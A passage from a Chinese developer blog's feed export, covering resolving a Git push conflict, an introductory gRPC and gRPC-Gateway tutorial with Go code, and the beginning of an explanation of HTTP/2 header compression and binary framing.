<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git push</span><br><span class="line">Username <span class="keyword">for</span> <span class="string">&#x27;https://github.com&#x27;</span>: 99MyCql</span><br><span class="line">Password <span class="keyword">for</span> <span class="string">&#x27;https://99MyCql@github.com&#x27;</span>:</span><br><span class="line">To https://github.com/99MyCql/TestOfGit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (fetch first)</span><br><span class="line">error: failed to push some refs to <span class="string">&#x27;https://github.com/99MyCql/TestOfGit.git&#x27;</span></span><br><span class="line">hint: Updates were rejected because the remote contains work that you <span class="keyword">do</span></span><br><span class="line">hint: not have locally. This is usually caused by another repository pushing</span><br><span class="line">hint: to the same ref. You may want to first integrate the remote changes</span><br><span class="line">hint: (e.g., <span class="string">&#x27;git pull ...&#x27;</span>) before pushing again.</span><br><span class="line">hint: See the <span class="string">&#x27;Note about fast-forwards&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;git push --help&#x27;</span> <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure>

<p>显然，远程版本库(A推送后更新了远程版本库)和本地版本库不相同，必然会出现冲突。<br>此时，我们需按照提示，先拉取最新的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">remote: Enumerating objects: 4, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (4/4), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 3 (delta 1), reused 3 (delta 1), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">From https://github.com/99MyCql/TestOfGit</span><br><span class="line">   f7a736f..69d4b68  dev        -&gt; origin/dev</span><br><span class="line">Auto-merging origin.md</span><br><span class="line">CONFLICT (add/add): Merge conflict <span class="keyword">in</span> origin.md</span><br><span class="line">Automatic merge failed; fix conflicts and <span class="keyword">then</span> commit the result.</span><br></pre></td></tr></table></figure>

<p>然后，跟解决<strong>合并分支冲突</strong>一样，进行手动解决。再将解决后内容提交并推送即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim origin.md</span><br><span class="line">$ git status</span><br><span class="line">On branch dev</span><br><span class="line">Your branch and <span class="string">&#x27;origin/dev&#x27;</span> have diverged,</span><br><span class="line">and have 1 and 1 different commits each, respectively.</span><br><span class="line">  (use <span class="string">&quot;git pull&quot;</span> to merge the remote branch into yours)</span><br><span class="line"></span><br><span class="line">You have unmerged paths.</span><br><span class="line">  (fix conflicts and run <span class="string">&quot;git commit&quot;</span>)</span><br><span class="line">  (use <span class="string">&quot;git merge --abort&quot;</span> to abort the merge)</span><br><span class="line"></span><br><span class="line">Unmerged paths:</span><br><span class="line">  (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to mark resolution)</span><br><span class="line"></span><br><span class="line">        both added:      origin.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use <span class="string">&quot;git add&quot;</span> and/or <span class="string">&quot;git commit -a&quot;</span>)</span><br><span class="line">$ git commit -a -m<span class="string">&quot;solve the conflict&quot;</span></span><br><span class="line">[dev 6cc66a2] solve the conflict</span><br><span class="line">$ git push</span><br><span class="line">Username <span class="keyword">for</span> <span class="string">&#x27;https://github.com&#x27;</span>: 99MyCql</span><br><span class="line">Password <span class="keyword">for</span> <span class="string">&#x27;https://99MyCql@github.com&#x27;</span>:</span><br><span class="line">Counting objects: 6, <span class="keyword">done</span>.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (4/4), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (6/6), 567 bytes | 51.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Total 6 (delta 2), reused 0 (delta 0)</span><br><span class="line">remote: Resolving deltas: 100% (2/2), completed with 1 <span class="built_in">local</span> object.</span><br><span class="line">To https://github.com/99MyCql/TestOfGit.git</span><br><span class="line">   69d4b68..6cc66a2  dev -&gt; dev</span><br></pre></td></tr></table></figure>

<h2 id="7-参考教程："><a href="#7-参考教程：" class="headerlink" title="7. 参考教程："></a>7. 参考教程：</h2><p><a href="https://git-scm.com/docs">git官网</a><br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000">廖雪峰git教程</a><br><a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html">阮一峰的网络日志</a></p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>grpc 入门</title>
    <url>/grpc%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>实习期间，公司项目使用 gRPC 框架。因此，简单入门一下 grpc。</p>
<p>项目代码地址：<a href="https://gitee.com/dounineli/grpcDemo">gitee</a></p>
<span id="more"></span>

<h2 id="1-微服务概述"><a href="#1-微服务概述" class="headerlink" title="1. 微服务概述"></a>1. 微服务概述</h2><p>在提起 <code>GRPC</code> 之前，不得不提起微服务。</p>
<p>long long ago，互联网还未繁荣起来，当时的网站应用功能较为简单，用户数量较少，应用代码只需部署在一台服务器上，便足矣。这种把应用整体打包部署的方式，也被称为<strong>单体架构</strong>。</p>
<p>但好景不长，随着互联网的迅猛发展，网站人数暴增，应用也开始变得复杂。这时，便出现了许多问题，比如：一台服务器容易出现性能瓶颈、应用代码稍微修改后便要重新部署、一个小服务的错误便会导致整个应用崩溃等等。</p>
<p>于是，应用开始分为各种小应用，分布式进行部署，同时采用负载均衡分摊各自的压力。</p>
<p>随着这种方式的不断发展，<strong>微服务架构（Microservices Architecture）</strong> 出现了。微服务架构的核心思想是：一个应用可分割为多个小的、相互独立的微服务，这些服务可以运行在各自的服务器、各自的进程中，开发和发布都没有依赖。不同服务通过一些轻量级交互机制来通信，服务可独立扩展伸缩，每个服务定义了明确的边界，不同的服务甚至可以采用不同的编程语言来实现，由独立的团队来维护。</p>
<p>微服务架构的优点已经不言而喻了：高耦合低内聚，甚至连开发语言都可以不同。</p>
<p>当然，微服务架构也存在其缺点：运维开销及成本增加、测试难度增大、提高了系统复杂性等等。</p>
<p>参考博客：</p>
<ul>
<li><a href="https://juejin.im/post/5cc7048ce51d456e811d2732#heading-2">一文彻底理解微服务架构</a></li>
<li><a href="https://www.zhihu.com/question/65502802">什么是微服务架构？</a></li>
</ul>
<h2 id="2-RPC-概述"><a href="#2-RPC-概述" class="headerlink" title="2. RPC 概述"></a>2. RPC 概述</h2><p>有了微服务架构，那么我们就要考虑各微服务之间如何进行通信了。<code>HTTP</code> 肯定不失为一种有效的方法，但此处要提起的却是另一种方法：<code>RPC</code>。</p>
<p><code>RPC</code> 的英文全称是 <code>Remote Procedure Call</code>，即远程过程调用，简单点说，就是服务器A可以<strong>像函数调用一样</strong>调用服务器B上的方法。</p>
<p>其原理大致如下：</p>
<p><img src="/grpc%E5%85%A5%E9%97%A8/3.jpeg" alt="1"></p>
<p>其组成结构大致如下：</p>
<p><img src="/grpc%E5%85%A5%E9%97%A8/4.png" alt="1"></p>
<p>可以看出，<code>RPC</code> 底层依然使用 <code>TCP</code> 等运输层协议进行网络通信，它跟 <code>HTTP</code> 较为相似，但比 <code>HTTP</code> 更便捷的是，它还封装了序列化与反序列化的功能。</p>
<p>或许，说到此处，还会有人疑惑：其实 <code>HTTP</code> 外加一层序列化与反序列化的封装后，也能实现 <code>RPC</code> 的功能，为何还需要使用 <code>RPC</code> 呢？</p>
<p>其实，<code>HTTP</code> 与 <code>RPC</code> 各有千秋。甚至在 <code>gRPC</code> 中，其底层就是 <code>HTTP2</code> 协议。所以，并没有孰优孰劣，只是可能 <code>RPC</code> 更加适用于服务与服务之间的通信，不需要 <code>HTTP1</code> 协议中多余的头部，序列化与反序列化的功能也更加完善，而且封装程度高、即拿即用，毕竟谁不喜欢方便呢？</p>
<p><strong>注意</strong>：另外，换一种说法，<code>RPC</code> 与 <code>HTTP</code> 并不在同一层面上，并不能直接比较。毕竟 <code>HTTP</code> 是一个应用层协议，而 <code>RPC</code> 更像一种通信机制、一种框架，它内部可能使用自己编写的应用层协议，也可能就是 <code>HTTP</code> 协议。文中的 <code>HTTP</code> 与 <code>RPC</code> 比较，可以看成是 <code>Restful API</code> 与 <code>RPC</code> 的比较。</p>
<p>参考博客：</p>
<ul>
<li><a href="https://dubbo.apache.org/zh-cn/blog/rpc-introduction.html">浅谈 RPC</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1591740">既然有 HTTP 请求，为什么还要用 RPC 调用？</a></li>
</ul>
<h2 id="3-gRPC-概述"><a href="#3-gRPC-概述" class="headerlink" title="3. gRPC 概述"></a>3. gRPC 概述</h2><p><code>gRPC</code> 是谷歌开发的一个开源、高性能 <code>RPC</code> 框架，它底层使用 <code>HTTP2</code> 协议，并支持多种语言。</p>
<blockquote>
<p>gRPC is a modern open source high performance RPC framework that can run in any environment.</p>
</blockquote>
<p>以下是 <a href="https://grpc.io/docs/what-is-grpc/introduction/"><code>gRPC</code> 的官方概述</a>：</p>
<blockquote>
<p>In gRPC, a client application can directly call a method on a server application on a different machine as if it were a local object, making it easier for you to create distributed applications and services. As in many RPC systems, gRPC is based around the idea of defining a service, specifying the methods that can be called remotely with their parameters and return types. On the server side, the server implements this interface and runs a gRPC server to handle client calls. On the client side, the client has a stub (referred to as just a client in some languages) that provides the same methods as the server.</p>
</blockquote>
<p><img src="/grpc%E5%85%A5%E9%97%A8/1.png" alt="1"></p>
<p>同时，gRPC 使用 <code>Protocol Buffers</code>（一个谷歌出品的成熟的序列化框架）定义接口。</p>
<p>那么，gRPC 有何优点呢？如下所示：</p>
<ol>
<li><p><strong>性能</strong>。gRPC具有较好的性能，其原因包含如下几点：</p>
<ul>
<li>应用层通信使用了 <code>HTTP/2</code> 协议。HTTP&#x2F;2 协议具有：头部采用二进制编码，并进行压缩；服务器推送；多路复用等优势，极大地提高了传输性能。</li>
<li>数据结构序列化使用了谷歌的 <code>Protocol Buffers</code> 协议。其最后生成的数据体积、序列化性能都优于 json、xml 等。</li>
</ul>
</li>
<li><p><strong>流</strong>。可以流式地发送和返回数据，比如：客户端想周期性地从服务端获取数据，以 HTTP&#x2F;1.1 的方式则是轮询，而在 gRPC 中只需定义流式地返回数据即可。这点得益于 <code>HTTP/2</code>。</p>
</li>
<li><p><strong>清晰的API规范</strong>。相比于 <code>Swagger API</code> 的接口定义规范，<code>.proto</code> 文件所的定义更加清晰。</p>
</li>
</ol>
<p>参考博客：</p>
<ul>
<li><a href="https://juejin.im/post/6844903863602905096">[译] 为什么我们要切换到 gRPC</a></li>
</ul>
<h2 id="4-gRPC-go-尝试"><a href="#4-gRPC-go-尝试" class="headerlink" title="4. gRPC-go 尝试"></a>4. gRPC-go 尝试</h2><p>首先，需要安装 <code>Protocol buffer</code> 编译器 <code>protoc</code>。</p>
<p>然后，安装用于生成 <code>go</code> 代码的 <code>protoc-gen-go</code> 插件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">go get github.com/golang/protobuf/protoc-gen-go</span><br></pre></td></tr></table></figure>

<p>之后，可参考官方示例，运行 grpc-helloworld 程序：<a href="https://grpc.io/docs/languages/go/quickstart/">go quickstart</a></p>
<h2 id="5-gRPC-Gateway-概述"><a href="#5-gRPC-Gateway-概述" class="headerlink" title="5. gRPC-Gateway 概述"></a>5. gRPC-Gateway 概述</h2><p>有了 <code>gRPC</code> 框架之后，服务之间的通信不成问题了。但是，人们又想，能不能通过 <code>protocol</code> 接口文件直接生成 <code>RESTful HTTP API</code> 呢？这样，微服务的接口不仅能通过 <code>gRPC</code> 被其它服务所调用，也能通过 <code>HTTP</code> 被浏览器端用户调用了。</p>
<p>基于这样的愿景，<code>gRPC-Gateway</code> 出道了。</p>
<p><a href="https://github.com/grpc-ecosystem/grpc-gateway">官方文档</a>如是说道：</p>
<blockquote>
<p>The grpc-gateway is a plugin of the Google protocol buffers compiler protoc. It reads protobuf service definitions and generates a reverse-proxy server which translates a RESTful HTTP API into gRPC.</p>
<p>This helps you provide your APIs in both gRPC and RESTful style at the same time.</p>
</blockquote>
<p><img src="/grpc%E5%85%A5%E9%97%A8/5.png" alt="1"></p>
<p>可以看出，<code>grpc-gateway</code> 能够根据 <code>.proto</code> 文件生成 <code>HTTP</code> 服务器代码 <code>Reverse Proxy</code>，并将 <code>gRPC</code> 接口转换成对应的 <code>RESTful API</code>。当 <code>HTTP</code> 客户端访问 <code>API</code> 时，<code>Reverse Proxy</code> 会将 <code>HTTP</code> 请求转换成对应的 <code>gRPC</code> 请求，并交给 <code>gRPC service</code>。</p>
<h2 id="6-gRPC-Gateway-尝试"><a href="#6-gRPC-Gateway-尝试" class="headerlink" title="6. gRPC-Gateway 尝试"></a>6. gRPC-Gateway 尝试</h2><p>OS：<strong>Windows10 pro</strong></p>
<p>首先，需要安装 <code>grpc-gateway</code> 对应的 <code>protoc</code> 插件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">go get github.com/grpc-ecosystem/grpc-gateway/protoc-gen-grpc-gateway</span><br><span class="line">go get github.com/grpc-ecosystem/grpc-gateway/protoc-gen-swagger</span><br></pre></td></tr></table></figure>

<p>然后，在 grpc-helloworld 程序的基础上，我们稍加改动。</p>
<p>项目目录如下：</p>
<p><img src="/grpc%E5%85%A5%E9%97%A8/6.png" alt="1"></p>
<p>修改 <code>helloworld.proto</code> 接口定义文件如下（<code>google/api/annotations.proto</code> 见<a href="https://github.com/grpc-ecosystem/grpc-gateway/blob/master/third_party/googleapis/">grpc-gateway&#x2F;third_party&#x2F;googleapis&#x2F;</a>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto3&quot;;</span><br><span class="line"></span><br><span class="line">package api;</span><br><span class="line"></span><br><span class="line">option go_package = &quot;grpcDemo/api&quot;;</span><br><span class="line"></span><br><span class="line">// grpc-gateway api</span><br><span class="line">import &quot;google/api/annotations.proto&quot;;</span><br><span class="line"></span><br><span class="line">// The hello service definition.</span><br><span class="line">service HelloService &#123;</span><br><span class="line">  // Sends a greeting</span><br><span class="line">  rpc SayHello (HelloRequest) returns (HelloReply) &#123;</span><br><span class="line">    option (google.api.http) = &#123;</span><br><span class="line">      post: &quot;/v1/helloService/sayHello&quot;</span><br><span class="line">      body: &quot;*&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// The request message containing the user&#x27;s name and age.</span><br><span class="line">message HelloRequest &#123;</span><br><span class="line">  string name = 1;</span><br><span class="line">  string age = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// The response message containing the greetings</span><br><span class="line">message HelloReply &#123;</span><br><span class="line">  string message = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成 grpc 相关文件 <code>.pb.go</code>，其中包括 用于序列化我们请求响应数据的代码、grpc 客户端 和 grpc 服务端：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">protoc -I%PROTOC_INCLUDE% -I%GOPATH%\src -Ithird_party\googleapis -I. --go_out=plugins=grpc:. api\helloworld.proto</span><br></pre></td></tr></table></figure>

<p>生成 gateway 文件 <code>.pb.gw.go</code>：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">protoc -I%PROTOC_INCLUDE% -I%GOPATH%\src -Ithird_party\googleapis -I. --grpc-gateway_out=logtostderr=true:. api\helloworld.proto</span><br></pre></td></tr></table></figure>

<p>生成 swagger 文档 <code>.swagger.json</code>：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">protoc -I%PROTOC_INCLUDE% -I%GOPATH%\src -Ithird_party\googleapis -I. --swagger_out=logtostderr=true:. api\helloworld.proto</span><br></pre></td></tr></table></figure>

<p>定义 <code>gRPC server</code> 代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Package main implements a server for Greeter service.</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;grpcDemo/api&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    port = <span class="string">&quot;:8081&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    logger = log.New(os.Stdout, <span class="string">&quot;[server] &quot;</span>, log.Lshortfile|log.Ldate|log.Ltime)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// server is used to implement api.HelloServiceServer.</span></span><br><span class="line"><span class="keyword">type</span> server <span class="keyword">struct</span> &#123;</span><br><span class="line">    api.UnimplementedHelloServiceServer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SayHello implements api.SayHello</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span></span> SayHello(ctx context.Context, req *api.HelloRequest) (*api.HelloReply, <span class="type">error</span>) &#123;</span><br><span class="line">    logger.Print(<span class="string">&quot;Received: &quot;</span>, req.String())</span><br><span class="line">    <span class="keyword">return</span> &amp;api.HelloReply&#123;Message: <span class="string">&quot;Hello &quot;</span> + req.GetName() + <span class="string">&quot;, your age is &quot;</span> + req.GetAge()&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// listening the tcp port</span></span><br><span class="line">    listen, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, port)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        logger.Fatalf(<span class="string">&quot;failed to listen: %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// register the server</span></span><br><span class="line">    s := grpc.NewServer()</span><br><span class="line">    api.RegisterHelloServiceServer(s, &amp;server&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// open the serve</span></span><br><span class="line">    logger.Print(<span class="string">&quot;server starting in &quot;</span>, port)</span><br><span class="line">    err = s.Serve(listen)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        logger.Fatalf(<span class="string">&quot;failed to serve: %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义 <code>grpc gateway</code> 代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// package main provide http gateway according to rpc-server</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;flag&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/grpc-ecosystem/grpc-gateway/runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;golang.org/x/net/context&quot;</span></span><br><span class="line">    <span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line"></span><br><span class="line">    gw <span class="string">&quot;grpcDemo/api&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    port = <span class="string">&quot;:8080&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    <span class="comment">// serverAddr gRPC server addr</span></span><br><span class="line">    serverAddr = flag.String(<span class="string">&quot;server_addr&quot;</span>, <span class="string">&quot;localhost:8081&quot;</span>, <span class="string">&quot;address of YourServer&quot;</span>)</span><br><span class="line">    logger     = log.New(os.Stdout, <span class="string">&quot;[gateway] &quot;</span>, log.Lshortfile|log.Ldate|log.Ltime)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    ctx := context.Background()</span><br><span class="line">    ctx, cancel := context.WithCancel(ctx)</span><br><span class="line">    <span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register HelloService handler.</span></span><br><span class="line">    mux := runtime.NewServeMux()</span><br><span class="line">    opts := []grpc.DialOption&#123;grpc.WithInsecure()&#125;</span><br><span class="line">    err := gw.RegisterHelloServiceHandlerFromEndpoint(ctx, mux, *serverAddr, opts)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Listening the port and open the serve.</span></span><br><span class="line">    logger.Print(<span class="string">&quot;gateway is running in &quot;</span>, port)</span><br><span class="line">    <span class="keyword">return</span> http.ListenAndServe(port, mux)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    flag.Parse()</span><br><span class="line"></span><br><span class="line">    err := run()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        logger.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行 grpc 服务端：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">go run server\server.go</span><br></pre></td></tr></table></figure>

<p>打开另一个命令行，运行 HTTP 网关：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">go run gateway\gateway.go</span><br></pre></td></tr></table></figure>

<p>最后，使用 <code>postman</code> 进行 <code>HTTP API</code> 接口测试：</p>
<p><img src="/grpc%E5%85%A5%E9%97%A8/2.png" alt="1"></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>grpc</tag>
      </tags>
  </entry>
  <entry>
    <title>grpc进阶-HTTP/2</title>
    <url>/grpc%E8%BF%9B%E9%98%B6-HTTP-2.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>面试的时候，面试官问我 gRPC 所使用的 HTTP&#x2F;2 协议有何优势，我支支吾吾没答好。</p>
<p>面试结束后，深刻意识到自身的问题：学习新技术框架，常常不求甚解，缺乏刨根问底的精神。</p>
<p>因此，抽空好好学习一下 HTTP&#x2F;2 。</p>
<p>也借此勉励各位，千万不能只会 <code>Hello world</code> 。</p>
<span id="more"></span>

<h2 id="1-HTTP-x2F-1-0-和-HTTP-x2F-1-1"><a href="#1-HTTP-x2F-1-0-和-HTTP-x2F-1-1" class="headerlink" title="1. HTTP&#x2F;1.0 和 HTTP&#x2F;1.1"></a>1. HTTP&#x2F;1.0 和 HTTP&#x2F;1.1</h2><h3 id="1-1-HTTP-x2F-1-0-存在的问题"><a href="#1-1-HTTP-x2F-1-0-存在的问题" class="headerlink" title="1.1. HTTP&#x2F;1.0 存在的问题"></a>1.1. HTTP&#x2F;1.0 存在的问题</h3><p>众所周知，HTTP&#x2F;1.0 存在如下问题：</p>
<ul>
<li>非持续连接：一个TCP连接只允许一个请求－响应，HTTP请求结束后，TCP连接就关闭。</li>
</ul>
<p>当同时有多个HTTP请求时，会造成TCP连接频繁地创建和销毁（三次握手、四次挥手），十分影响性能。</p>
<p>为了解决这个问题，HTTP&#x2F;1.1 提出了长连接 <code>Keep-Alive</code> ：多个HTTP请求可复用一个TCP连接，当没有HTTP请求时，TCP连接还会保持一段时间才关闭。</p>
<h3 id="1-2-HTTP-x2F-1-1-存在的问题"><a href="#1-2-HTTP-x2F-1-1-存在的问题" class="headerlink" title="1.2. HTTP&#x2F;1.1 存在的问题"></a>1.2. HTTP&#x2F;1.1 存在的问题</h3><p>但随着网站的请求越来越多，对网络通信性能要求越来越高，HTTP&#x2F;1.1 也逐渐暴露出了一些问题：</p>
<ol>
<li><p><strong>线头阻塞（Head-of-line blocking）问题</strong>。当一个HTTP请求进入一个TCP连接时，它必须等待前一个请求-响应完成，才能发送。前一个请求-响应花费的时间越多，它等待的时间也就越长，即便它已经准备好了。为解决此问题，HTTP&#x2F;1.1 提出了 <a href="https://zh.wikipedia.org/wiki/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96">HTTP管线化（HTTP pipelining）</a> 技术，可同时发送多个 HTTP 请求，但服务器依旧按照顺序响应，还是会存在阻塞问题。</p>
</li>
<li><p><strong>浏览器限制TCP连接数</strong>。虽然我们可以通过开启多个TCP连接并行的方式，解决线头阻塞的问题，但新的问题又出现了：对于同一个域名，浏览器最多只能同时创建 6~8 个 TCP 连接。并且，频繁地创建销毁TCP连接，依旧会影响性能。</p>
</li>
<li><p>Header 头部内容多，而且没有进行压缩优化。</p>
</li>
<li><p>等等。。。</p>
</li>
</ol>
<p>为了解决这一系列问题，HTTP&#x2F;2 出现了。</p>
<h2 id="2-HTTP-x2F-2-简史"><a href="#2-HTTP-x2F-2-简史" class="headerlink" title="2. HTTP&#x2F;2 简史"></a>2. HTTP&#x2F;2 简史</h2><p>2009年，谷歌公布了一个实验性协议——<strong>SPDY</strong>，用于解决 HTTP&#x2F;1.1 的性能问题。</p>
<p>2012年，察觉到 SPDY 协议的趋势，HTTP工作组开始征集 HTTP&#x2F;2 的建议，并基于 SPDY 制定了第一个 HTTP&#x2F;2 草案。</p>
<p>2015年，IESG 批准 HTTP&#x2F;2 和 HPACK 草案，RFC 7540 (HTTP&#x2F;2) 和 RFC 7541 (HPACK) 发布。</p>
<h2 id="3-HTTP-x2F-2-简介"><a href="#3-HTTP-x2F-2-简介" class="headerlink" title="3. HTTP&#x2F;2 简介"></a>3. HTTP&#x2F;2 简介</h2><p>官方文档：<a href="https://httpwg.org/specs/rfc7540.html#Overview">RFC 7540</a></p>
<p>官方介绍：</p>
<blockquote>
<p>HTTP&#x2F;2 enables a more efficient use of network resources and a reduced perception of latency by introducing header field compression and allowing multiple concurrent exchanges on the same connection. It also introduces unsolicited push of representations from servers to clients.</p>
</blockquote>
<p>其中，提到了三个重点：</p>
<ol>
<li><code>header field compression</code></li>
<li><code>multiple concurrent exchanges on the same connection</code></li>
<li><code>unsolicited push of representations from servers to clients</code></li>
</ol>
<p>以下，将从这三点依次介绍。</p>
<h3 id="3-1-头部压缩"><a href="#3-1-头部压缩" class="headerlink" title="3.1. 头部压缩"></a>3.1. 头部压缩</h3><p>在 HTTP&#x2F;1.1 中，头部数据以文本形式传输（ASCII编码：一个字符占用一个字节）。</p>
<p>而在 HTTP&#x2F;2 中，则采用<strong>HPACK 算法</strong>进行压缩。</p>
<p>HPACK 算法原理大致如下（参考博客：<a href="https://juejin.im/post/6844903667569541133">HTTP2 详解</a>）：</p>
<ul>
<li><p>每个TCP连接都维护着一个<strong>静态索引表（static table）</strong>和<strong>动态索引表（Dynamic table）</strong>，静态索引表是固定的，动态索引表初始为空。索引表的每一项是一个键值对。</p>
</li>
<li><p>对于 HTTP&#x2F;2 报文头部的每一项（键值对），匹配当前静态索引表和动态索引表：</p>
<ul>
<li>若某个键值对已存在，则<strong>用相应的索引号代替这个首部项</strong>，比如：<code>:method: GET</code> 匹配到静态索引表中的第2项，传输时只需要传输一个包含 <code>2</code> 的字节即可；</li>
<li>若索引空间中不存在，则用字符编码传输，字符编码可以选择<strong>Huffman 编码</strong>，然后分情况判断是否需要存入动态索引表中。</li>
</ul>
</li>
</ul>
<p><img src="/grpc%E8%BF%9B%E9%98%B6-HTTP-2%5C2.png" alt="1"></p>
<h3 id="3-2-同一连接上请求并发"><a href="#3-2-同一连接上请求并发" class="headerlink" title="3.2. 同一连接上请求并发"></a>3.2. 同一连接上请求并发</h3><h4 id="3-2-1-二进制分帧层"><a href="#3-2-1-二进制分帧层" class="headerlink" title="3.2.1. 二进制分帧层"></a>3.2.1. 二进制分帧层</h4><p>二进制分帧层是 HTTP&#x2F;2 <strong>性能增强的核心</strong>，存在于应用层 HTTP&#x2F;2 与传输层 TCP 之间。</p>
<p><img src="/grpc%E8%BF%9B%E9%98%B6-HTTP-2%5C1.png" alt="1"></p>
<p>它将一个 HTTP&#x2F;2 请求报文（<strong>流</strong>）划分成更小的<strong>帧（frame）</strong>，再将多个请求的帧合并成一个新的报文交给TCP。</p>
<p>接收方TCP将报文交给二进制分帧层后，它会将每一帧抽离出来，拼接到对应的 HTTP&#x2F;2 报文中。</p>
<p>多个 HTTP&#x2F;2 请求复用一个 TCP 报文，从而实现了并发。相比于 HTTP&#x2F;1.1 中一个请求独占一个 TCP 报文，这就像数据交换中<strong>报文交换到分组交换的改进</strong>。</p>
<p>同时，这也与<strong>进程并发</strong>的思想相同。</p>
